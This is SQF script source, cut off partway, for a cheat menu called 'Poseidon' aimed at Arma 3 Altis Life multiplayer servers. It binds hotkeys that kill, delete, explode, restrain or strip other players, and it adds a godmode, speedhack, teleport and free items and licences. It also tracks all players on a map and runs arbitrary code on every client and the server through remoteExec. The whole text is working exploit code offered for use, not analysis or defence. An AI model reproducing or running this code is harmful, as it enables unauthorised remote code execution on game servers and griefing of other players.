[]spawn {
	hint "Poseidon Loaded";
	sleep 1;
	if(player getVariable['Running',false])exitWith{};
	if(str(profileNamespace getVariable['MLRN_RE',{}])=="{}")then{profileNamespace setVariable['MAIN_RE',{_this remoteExec["BIS_FNC_SPAWN",0]}]};
	player setVariable['Running',true];
	[]spawn{
		while{true}do{
			((finddisplay 7300)displayCtrl 7302)ctrlEnable true;
			((finddisplay 49) displayCtrl 122)ctrlEnable true;
			sleep 1;
		};
	};
	(finddisplay 46)displayAddEventHandler['KeyDown',{
		switch(_this select 1)do{
			case 0xCF:{
				hint parseText "<t color=""#3CA6A6"" size=""1"">END  = Show Hotkeys</t><br/> <t color=""#3CA6A6"" size=""1"">Num0  = Revive Self</t><br/> <t color=""#3CA6A6"" size=""1"">Num1  = Delete CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num2  = Heal CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num3  = Kill CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num4  = Revive CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num5  = Restraine CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num6  = Explode CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num7  = Strip Down CursorTarget</t><br/> <t color=""#3CA6A6"" size=""1"">Num8  = Speedhack ON/OFF</t><br/> <t color=""#3CA6A6"" size=""1"">Num9  = Get keys</t><br/>H = Open ATM";
			};
			case 0x4F:{
				if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target deleted: '+getText(configFile>>'CfgVehicles'>>typeOf cursorTarget>>'displayName'));
				deleteVehicle cursorTarget;
			};
			case 0x50:{
				if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target healed: '+getText(configFile>>'CfgVehicles'>>typeOf cursorTarget>>'displayName'));
				cursorTarget setDamage 0;
			};
			case 0x51:{
			    if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target destroyed: '+getText(configFile>>'CfgVehicles'>>typeOf cursorTarget>>'displayName'));
				cursorTarget setDamage 1;
			};
			case 0x4B:{
			    if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target revived: '+name cursorTarget);
				[['Bastian Suter'],'life_fnc_revived',cursorTarget,false]call life_fnc_MP;
			};
			case 0x4C:{
			    if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target restrained: '+name cursorTarget);
			    _1=cursorTarget;_1 setVariable['realname','Bastian Suter',true];_1 setVariable['restrained',true,true];[[_1],'life_fnc_restrain',_1,false]call life_fnc_MP;
			};
			case 0x4D:{
			     if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Target blown up: '+name cursorTarget);
			    _1="HelicopterExploBig"createVehicleLocal[0,0,0];_1 setPosASL eyePos cursorTarget;
			};
			case 0x47:{
				if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Stripped target down: '+name cursorTarget);
				{cursorTarget removeWeaponGlobal _x}forEach weapons cursorTarget;
				removeAllItems cursorTarget;removeAllAssignedItems cursorTarget;removeUniform cursorTarget;removeVest cursorTarget;removeBackpack cursorTarget;removeHeadgear cursorTarget;removeGoggles cursorTarget;
			};
			case 0x48:{
				if (!isNull(player getVariable['Dummy',objNull])) then {
					if((getAnimSpeedCoef(player getVariable'Dummy'))>1)then{
				    	hint'Speedhack deactivated';
						(player getVariable'Dummy') setAnimSpeedCoef 1;
					}else{
				    	hint'Speedhack activated';
						(player getVariable'Dummy') setAnimSpeedCoef 10;
					}
				}else{
					if((getAnimSpeedCoef player)>1)then{
				    	hint'Speedhack deactivated';
						player setAnimSpeedCoef 1;
					}else{
				    	hint'Speedhack activated';
						player setAnimSpeedCoef 10;
					}
				};
			};
			case 0x49:{
				if(isNull cursorTarget)exitWith{hint'No target found!'};
				hint('Got keys for: '+getText(configFile>>'CfgVehicles'>>typeOf cursorTarget>>'displayName'));
				life_vehicles pushBack cursorTarget;
			};
			case 0x24:{
				[] spawn yoasdasdasdasdayoitsfghjghfgyaboidanielandsamielasdassdfgjhdasddsfscomingbackfore4578uigjanothererpvideo030203jkdskuykfljsdlkfjsdlkfgghdfoigjdslfkj;
			};
		};
	false}];

    yoasdasdasdasdayoitsfghjghfgyaboidanielandsamielasdassdfgjhdasddsfscomingbackfore4578uigjanothererpvideo030203jkdskuykfljsdlkfjsdlkfgghdfoigjdslfkj = {
    []spawn {
        private ["_map2"];
        disableSerialization;

        _map2=controlNull;
        while {isNull _map2} do {
            {if !(isNil {_x displayctrl 101}) then {_map2= _x displayctrl 101};} count (uiNamespace getVariable "IGUI_Displays");
            _map2 ctrlMapAnimAdd[0,0,position player];
            ctrlMapAnimCommit _map2;
            sleep 0.5;
        };
        _map2 ctrlSetPosition [0.0102784 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.123719 * safezoneW,0.208956 * safezoneH];
        _map2 ctrlSetBackgroundColor [0.157,0.157,0.157,0.5];
        _map2 ctrlCommit 0;
        _map2 ctrlRemoveAllEventHandlers"draw";
        _display = ctrlParent _map2;
        _0 = _display displayCtrl 1001;
        _0 ctrlShow false;
        _1 = _display displayCtrl 1002;
        _1 ctrlShow false;
        _2 = _display displayCtrl 1003;
        _2 ctrlShow false;
        _3 = _display displayCtrl 1004;
        _3 ctrlShow false;
        _4 = _display displayCtrl 1200;
        _4 ctrlShow false;
        _5 = _display displayCtrl 1000;
        _5 ctrlShow false;
        _map2 ctrlAddEventHandler ['Draw', {
            _2=_this select 0;
            {
                if(true)then{
                    _3=if(vehicle _x==_x)then{name _x}else{_1='(';{_1=_1+(if(_forEachIndex==0)then{''}else{', '})+name _x}forEach(crew(vehicle _x));_1=_1+')';format['%1%2',getText(configFile>>'CfgVehicles'>>typeOf(vehicle _x)>>'displayName'),_1]};
                    _4=if(vehicle _x==_x)then{'iconMan'}else{switch(true)do{case((vehicle _x)isKindOf'Man'):{'iconman'};case((vehicle _x)isKindOf'Car'):{'iconcar'};case((vehicle _x)isKindOf'Tank'):{'iconcar'};case((vehicle _x)isKindOf'Air'):{'iconhelicopter'};case((vehicle _x)isKindOf'Ship'):{'iconship'}}};
                    _5=switch(side _x)do{case BLUFOR:{[0,0.298,0.596,1]};case OPFOR:{[0.502,0,0,1]};case INDEPENDENT:{[0,0.502,0,1]};case CIVILIAN:{[0.4,0,0.502,1]};case default{[0.996,0.655,0.114,1]}};
                    _2 drawIcon[_4,_5,getPos _x,24,24,getDir _x,_3,1,0.025,'PuristaMedium','right'];
                };
            }forEach allPlayers;
        }];
        hint "Minimap Found and Hooked";
    };

    hint'';
    disableSerialization;
    _FNC_LISTWEAPONS={
        ((finddisplay 24)displayCtrl 2407)ctrlEnable false;
        ((finddisplay 24)displayCtrl 2408)ctrlEnable true;
        ((finddisplay 24)displayCtrl 2409)ctrlEnable true;
        _1=[];
        _3=configFile >> 'CfgWeapons';
        for '_i' from 0 to count (_3)-1 do {
            _2=_3 select _i;
            if(isClass _2)then{
                _4=configName _2;
                _5=getNumber(_2 >> 'scope');
                _6=getText(_2 >> 'picture');
                _7=getText(_2 >> 'displayName');
                if(_5==2&&_6!=''&&_7!='') then {
                    _1=_1 + [[_7,_4,_6]];
                };
            };
        };
        copyToClipboard str _1;
        {
            _8=_x;
            _9=_8 select 0;
            _10=_8 select 1;
            _11=_8 select 2;
            _i=((finddisplay 24)displayCtrl 1500)tvAdd[[],_9];
            ((finddisplay 24)displayCtrl 1500)tvSetPicture[[_i],_11];
            ((finddisplay 24)displayCtrl 1500)tvSetData[[_i],_10];
        }forEach _1;
        ((finddisplay 24)displayCtrl 1500)tvSetCurSel[0]
    };

    _1=[
            [5501,"Map",[1,"",[0.211322 * safezoneW + safezoneX,0.225057 * safezoneH + safezoneY,0.577356 * safezoneW,0.549885 * safezoneH],[-1,-1,-1,-1],[-1,-1,-1,-1],[-1,-1,-1,-1],"","-1"],[]],
            [2200,"back1",[1,"",[-0.000156274 * safezoneW + safezoneX,0.225 * safezoneH + safezoneY,0.20625 * safezoneW,0.198 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2201,"back2",[1,"",[-0.000156274 * safezoneW + safezoneX,0.489 * safezoneH + safezoneY,0.20625 * safezoneW,0.286 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2202,"back3",[1,"",[0.793906 * safezoneW + safezoneX,0.225 * safezoneH + safezoneY,0.20625 * safezoneW,0.55 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1500,"spawning Menu",[1,"",[0.793833 * safezoneW + safezoneX,0.225057 * safezoneH + safezoneY,0.206199 * safezoneW,0.549885 * safezoneH],[-1,-1,-1,-1],[-1,-1,-1,-1],[-1,-1,-1,-1],"","-1"],[]],
            [1502,"funktions Menu",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.225058 * safezoneH + safezoneY,0.206199 * safezoneW,0.197958 * safezoneH],[-1,-1,-1,-1],[-1,-1,-1,-1],[-1,-1,-1,-1],"","-1"],[]],
            [1503,"player Menu",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.489002 * safezoneH + safezoneY,0.206199 * safezoneW,0.28594 * safezoneH],[-1,-1,-1,-1],[-1,-1,-1,-1],[-1,-1,-1,-1],"","-1"],[]],
            [2400,"Self Options",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Self Options",[0.00512342 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2401,"Remote Menu",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Remote Menu",[0.139152 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2402,"Target menu",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Target menu",[0.072138 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2403,"Life Menu",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Life Menu",[0.00512342 * safezoneW + safezoneX,0.423016 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2404,"Dummy Menu",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Dummy Menu",[0.139152 * safezoneW + safezoneX,0.423016 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2406,"Trolling",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Trolling",[0.072138 * safezoneW + safezoneX,0.423016 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2407,"Weapons",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Weapons",[0.798988 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,11,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2408,"Vehicles",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Vehicles",[0.933017 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2409,"Altis Life",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Altis Life",[0.866003 * safezoneW + safezoneX,0.170069 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[4]],
            [2410,"Debug",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Debug",[0.00512342 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2411,"Cheat Engine",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Cheat Engine",[0.139152 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.032931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2412,"MapButton",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Map",[0.072138 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],

            [2205,"editBoxBack",[1,"",[0.211322 * safezoneW + safezoneX,0.247053 * safezoneH + safezoneY,0.577356 * safezoneW,0.527889 * safezoneH],[-1,-1,-1,-1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2441,"Target",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Target ex.",[0.51031 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2442,"Global",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Global ex.",[0.577324 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2443,"Local",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Local ex.",[0.644339 * safezoneW + safezoneX,0.774942 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1102,"EditBox Top",[1,"",[0.211322 * safezoneW + safezoneX,0.225058 * safezoneH + safezoneY,0.577356 * safezoneW,0.0219954 * safezoneH],[-1,-1,-1,-1],[1,1,1,1],[-1,-1,-1,-1],"","-1"],[]],

            [2444,"Title1",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Search",[0.505155 * safezoneW + safezoneX,0.390023 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0,0,0,1],[-1,-1,-1,-1],"","-1"],[]],
            [1501,"TreeAllVars",[1,"",[0.29375 * safezoneW + safezoneX,0.302 * safezoneH + safezoneY,0.201094 * safezoneW,0.451 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1401,"edit",[1,"",[0.505156 * safezoneW + safezoneX,0.302 * safezoneH + safezoneY,0.201094 * safezoneW,0.033 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1000,"Title2",[1,"Scan Type",[0.505155 * safezoneW + safezoneX,0.346032 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2100,"searchbox",[1,"",[0.567031 * safezoneW + safezoneX,0.346 * safezoneH + safezoneY,0.139219 * safezoneW,0.033 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1001,"Title3",[1,"Search Variables",[0.293801 * safezoneW + safezoneX,0.269048 * safezoneH + safezoneY,0.103099 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1504,"TreeSelected",[1,"",[0.505156 * safezoneW + safezoneX,0.478 * safezoneH + safezoneY,0.201094 * safezoneW,0.154 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1808,"Frame7",[1,"",[0.29375 * safezoneW + safezoneX,0.302 * safezoneH + safezoneY,0.201094 * safezoneW,0.451 * safezoneH],[1,1,1,1],[0,1,0,1],[-1,-1,-1,-1],"","-1"],[]],
            [1809,"Frame8",[1,"",[0.505156 * safezoneW + safezoneX,0.478 * safezoneH + safezoneY,0.201094 * safezoneW,0.154 * safezoneH],[1,1,1,1],[0,1,0,1],[-1,-1,-1,-1],"","-1"],[]],
            [1003,"Title4",[1,"Selected Variables",[0.505155 * safezoneW + safezoneX,0.445012 * safezoneH + safezoneY,0.0979443 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1005,"Title6",[1,"Value",[0.505155 * safezoneW + safezoneX,0.269048 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1402,"valueBox",[0,"",[0.5125,0.82,0.4875,0.06],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [1006,"Title7",[1,"New Value",[0.505155 * safezoneW + safezoneX,0.64297 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0.157,0.157,0.157,0.5],[-1,-1,-1,-1],"","-1"],[]],
            [2445,"Title8",[1,"<t align='center'size='0.8'font='PuristaSemiBold'>Set Value",[0.505155 * safezoneW + safezoneX,0.719954 * safezoneH + safezoneY,0.0618596 * safezoneW,0.0329931 * safezoneH],[1,1,1,1],[0,0,0,1],[-1,-1,-1,-1],"","-1"],[]],

            [1800,"Frame",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.467007 * safezoneH + safezoneY,0.206199 * safezoneW,0.307935 * safezoneH],[0,0,1,1],[0,0,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1801,"Frame",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.203062 * safezoneH + safezoneY,0.206199 * safezoneW,0.219954 * safezoneH],[0,0,1,1],[0,0,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1802,"Frame",[1,"",[0.211322 * safezoneW + safezoneX,0.225057 * safezoneH + safezoneY,0.577356 * safezoneW,0.549885 * safezoneH],[0,0,1,1],[0,0,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1803,"Frame",[1,"",[0.793833 * safezoneW + safezoneX,0.203062 * safezoneH + safezoneY,0.206199 * safezoneW,0.57188 * safezoneH],[0,0,1,1],[0,0,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1100,"player Menu Top",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.467007 * safezoneH + safezoneY,0.206199 * safezoneW,0.0219954 * safezoneH],[-1,-1,-1,-1],[1,1,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1101,"funktions Menu Top",[1,"",[-3.15371e-005 * safezoneW + safezoneX,0.203062 * safezoneH + safezoneY,0.206199 * safezoneW,0.0219954 * safezoneH],[-1,-1,-1,-1],[1,1,1,1],[-1,-1,-1,-1],"","-1"],[]],
            [1103,"spawning Menu Top",[1,"",[0.793833 * safezoneW + safezoneX,0.203062 * safezoneH + safezoneY,0.206199 * safezoneW,0.0219954 * safezoneH],[-1,-1,-1,-1],[1,1,1,1],[-1,-1,-1,-1],"","-1"],[]]
        ];

    (finddisplay 46)createDisplay"RscDisplayChat";
    {_x ctrlShow false}forEach allControls(finddisplay 24);

    {
        disableSerialization;
        private["_1","_2","_3","_4","_5","_6","_7","_8","_9","_10","_11"];
        _1=_x select 0;
        _2=_x select 1;
        _3=_x select 2;
        _4=_3 select 1;
        _5=_3 select 2;
        _6=_3 select 3;
        _7=_3 select 4;
        _8=_3 select 5;
        _9=_3 select 6;
        _10=(format["%1",_1] select [0,2]);
        _10=call compile _10;
        _10=switch(_10)do{
            case 10:{"RscStructuredText"};
            case 11:{"RscStructuredText"};
            case 12:{"RscPicture"};
            case 14:{"RscEdit"};
            case 15:{"RscTree"};
            case 16:{"RscButton"};
            case 18:{"RscFrame"};
            case 21:{"RscCombo"};
            case 22:{"RscBackground"};
            case 24:{"RscButtonMenu"};
            case 55:{"RscMapControl"};
        };
        _11=(finddisplay 24)ctrlCreate[_10, _1];
        _11 ctrlSetFade 1;
        _11 ctrlSetPosition [0,0,0,0];
        if(_10!="RscTree") then {
            _11 ctrlSetTextColor _6;
            _11 ctrlSetBackgroundColor _7;
            _11 ctrlSetActiveColor _8;
            if(_10 in["RscStructuredText","RscButtonMenu"])then{_11 ctrlSetStructuredText parseText _4}else{_11 ctrlSetText _4};
        };
        if!(_9=="")then{_11 buttonsetAction _9};
        if (_11 == findDisplay 24 displayCtrl 5501) then {
            _map = findDisplay 24 displayCtrl 5501;
            _map ctrlShow false;
            _map ctrlSetPosition [0.211322 * safezoneW + safezoneX,0.225057 * safezoneH + safezoneY,0.577356 * safezoneW,0 * safezoneH];
            _map ctrlCommit 0;
        };
        _11 ctrlCommit 0;
        _11 ctrlSetPosition _5;
        _11 ctrlCommit .1;
    }forEach _1;
    {((finddisplay 24)displayCtrl 2100)lbAdd _x}forEach['SCALAR','CODE','STRING','BOOL'];

    {
        _1=((finddisplay 24)displayCtrl 1504)tvAdd[[],(_x select 0)];
        ((finddisplay 24)displayCtrl 1504)tvSetData[[_1],(_x select 1)];
    }forEach(uiNamespace getVariable['shit',[]]);

    sleep 0.05;

    _1=findDisplay 24 ctrlCreate['RscAttributeExec',1113];_1 ctrlSetFade 1;_1 ctrlSetPosition [0.293801 * safezoneW + safezoneX,0.225057 * safezoneH + safezoneY,0.412397 * safezoneW,0.549885 * safezoneH];_1 ctrlCommit 0;((findDisplay 24)displayCtrl 13366)ctrlShow false;((findDisplay 24)displayCtrl 14466)ctrlShow false;_2=((findDisplay 24) displayCtrl 13766);_2 ctrlSetFade 1;_2 ctrlSetText'//code here';_2 ctrlSetPosition [0.293801 * safezoneW + safezoneX,0.247053 * safezoneH + safezoneY,0.412397 * safezoneW,0.527889 * safezoneH];_2 ctrlCommit 0;uinamespace setVariable['ExecCode',_2];
    {((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2410,false],[2411,true],[2412,true]];
    {((finddisplay 24)displayCtrl(_x select 0))ctrlShow(_x select 1)}forEach[[1611,false],[1808,false],[1809,false],[2444,false],[2445,false],[1501,false],[1401,false],[1000,false],[2100,false],[1001,false],[1002,false],[1504,false],[1003,false],[1004,false],[1005,false],[1402,false],[1006,false],[1600,false]];

    {
        if (ctrlClassName _x != "RscTree") then {
            _x ctrlsetfade 0;
            _x ctrlCommit .2;
        };
    } forEach allControls findDisplay 24;

    {
        _i=((finddisplay 24)displayCtrl 1503)tvAdd[[],(format["[%1]%2",side _x,name _x])];
        ((finddisplay 24)displayCtrl 1503)tvSetData[[_i],netId _x];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["UID: %1",getPlayerUID _x]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Position: %1",mapGridPosition _x]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Headgear: %1",(getText(configFile >> "CfgWeapons" >> (headgear _x) >> "displayName"))]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Goggles: %1",(getText(configFile >> "CfgWeapons" >> (goggles _x) >> "displayName"))]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Uniform: %1",(getText(configFile >> "CfgWeapons" >> (uniform _x) >> "displayName"))]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Vest: %1",(getText(configFile >> "CfgWeapons" >> (vest _x) >> "displayName"))]];
        ((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Backpack: %1",(getText(configFile >> "CfgVehicles" >> (backpack _x) >> "displayName"))]];
        {
            if(format["%1",_x] != "Binocular") then {((finddisplay 24)displayCtrl 1503) tvAdd [[_i],format["Weapon: %1",(getText(configFile >> "CfgWeapons" >> _x >> "displayName"))]]}
        }forEach(weapons _x);
    }forEach allPlayers;

    call _FNC_LISTWEAPONS;

    ((finddisplay 24)displayCtrl 1500)ctrlAddEventHandler["TreeDblClick",{
        switch(true)do{
            case(!ctrlEnabled((finddisplay 24)displayCtrl 2407)):{
                _1=(((finddisplay 24)displayCtrl 1500)tvData(tvCurSel((finddisplay 24)displayCtrl 1500)));
                _2=nearestObjects[player,["GroundWeaponHolder"],3];
                _3=(if(count _2<1)then{"GroundWeaponHolder"createVehicle(position player)}else{_2 select 0});
                _3 addItemCargo[_1,1];
                _4=(getArray(configFile>>"CfgWeapons">>_1>>"Magazines")select 0);
                _3 addItemCargo[_4,5];
                hint format['[+] Item spawned: %1',getText(configFile>>'CfgWeapons'>>_1>>'displayName')]
            };
            case(!ctrlEnabled((finddisplay 24)displayCtrl 2408)):{
                _1=(((finddisplay 24)displayCtrl 1500)tvData(tvCurSel((finddisplay 24)displayCtrl 1500)));
                _1 createVehicle(position player);
                hint format['[+] Vehicle spawned: %1',getText(configFile>>'CfgVehicles'>>_1>>'displayName')];
            };
            case default{
                _1=(((finddisplay 24)displayCtrl 1500)tvData(tvCurSel((finddisplay 24)displayCtrl 1500)));
                _2=(((finddisplay 24)displayCtrl 1500)tvPicture(tvCurSel((finddisplay 24)displayCtrl 1500)));
                if(_2=='')then{
                    hint format['[+] License added: %1',localize getText(missionConfigFile>>'Licenses'>>_1>>'displayName')];
                    missionNamespace setVariable[format['license_civ_%1',_1],true];
                }else{
                    hint format['[+] Items added: %1',localize getText(missionConfigFile>>'VirtualItems'>>_1>>'displayName')];
                    missionNamespace setVariable[format['life_inv_%1',_1],(missionNamespace getVariable(format['life_inv_%1',_1]))+10];
                };
            };
        };
    }];

    ((finddisplay 24)displayCtrl 5501)ctrlAddEventHandler ['Draw', {
        _2=_this select 0;
        {
            if(true)then{
                _3=if(vehicle _x==_x)then{name _x}else{_1='(';{_1=_1+(if(_forEachIndex==0)then{''}else{', '})+name _x}forEach(crew(vehicle _x));_1=_1+')';format['%1%2',getText(configFile>>'CfgVehicles'>>typeOf(vehicle _x)>>'displayName'),_1]};
                _4=if(vehicle _x==_x)then{'iconMan'}else{switch(true)do{case((vehicle _x)isKindOf'Man'):{'iconman'};case((vehicle _x)isKindOf'Car'):{'iconcar'};case((vehicle _x)isKindOf'Tank'):{'iconcar'};case((vehicle _x)isKindOf'Air'):{'iconhelicopter'};case((vehicle _x)isKindOf'Ship'):{'iconship'}}};
                _5=switch(side _x)do{case BLUFOR:{[0,0.298,0.596,1]};case OPFOR:{[0.502,0,0,1]};case INDEPENDENT:{[0,0.502,0,1]};case CIVILIAN:{[0.4,0,0.502,1]};case default{[0.996,0.655,0.114,1]}};
                _2 drawIcon[_4,_5,getPos _x,24,24,getDir _x,_3,1,0.025,'PuristaMedium','right'];
            };
        }forEach allPlayers;
    }];
    []spawn{inGameUISetEventHandler['PrevAction','true'];inGameUISetEventHandler['Action','true'];inGameUISetEventHandler['NextAction','true'];waitUntil{isNull(finddisplay 24)};inGameUISetEventHandler['PrevAction',''];inGameUISetEventHandler['Action',''];inGameUISetEventHandler['NextAction','']};

    _FUNCTIONS_SELF=[
        ['HEAL PLAYER',{hint'Healed yourself';(vehicle player)setDamage 0;(vehicle player)setFuel 1}],
        ['KILL PLAYER',{hint'Killed yourself';(vehicle player)setDamage 1}],
        ['BACK TO LOBBY',{hint'Backed out to lobby';(finddisplay 24)closeDisplay 0;endMission'endDefault'}],
        ['MAP TELEPORT',{hint'Click on the map to teleport';{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2410,true],[2411,true],[2412,false]];{((finddisplay 24)displayCtrl(_x select 0))ctrlShow(_x select 1)}forEach[[1113,false],[1808,false],[1809,false],[1611,false],[1501,false],[2444,false],[2445,false],[1401,false],[1000,false],[2100,false],[1001,false],[1002,false],[1504,false],[1003,false],[1004,false],[1005,false],[1402,false],[1006,false],[1600,false],[13766,false],[1102,false],[2205,false],[5501,true],[2441,false],[2442,false],[2443,false]];onMapSingleClick{onMapSingleClick{};player setPos _pos;hint('Teleportet: '+str(_pos))}}],
        ['GODMODE',{hint'Godmode activated';player removeAllEventHandlers'HandleDamage';player addEventHandler['HandleDamage',{false}]},{hint'Godmode deactivated';player removeAllEventHandlers'HandleDamage'}],
        ['INVISIBLE (RE)',{hint'Invisiblity activated';(compile format['if(!isServer)exitWith{};(objectFromNetId"%1")hideObjectGlobal true',netID player])call(profileNamespace getVariable'MAIN_RE')},{hint'Invisiblity deactivated';(compile format['if(!isServer)exitWith{};(objectFromNetId"%1")hideObjectGlobal false',netID player])call(profileNamespace getVariable'MAIN_RE')}],
        ['RAPID FIRE',{hint'Rapid Fire activated';vehicle player setWeaponReloadingTime[vehicle player,currentWeapon vehicle player,0]},{hint'Rapid Fire deactivated';vehicle player setWeaponReloadingTime[vehicle player,currentWeapon vehicle player,1]}],
        ['SPEEDHACK',{hint'Speedhack on';player setAnimSpeedCoef 10},{hint'Speedhack off';player setAnimSpeedCoef 1}],
        ['NO GRASS',{hint'No grass on';setTerrainGrid 50},{hint'No grass off';setTerrainGrid 12.5}],
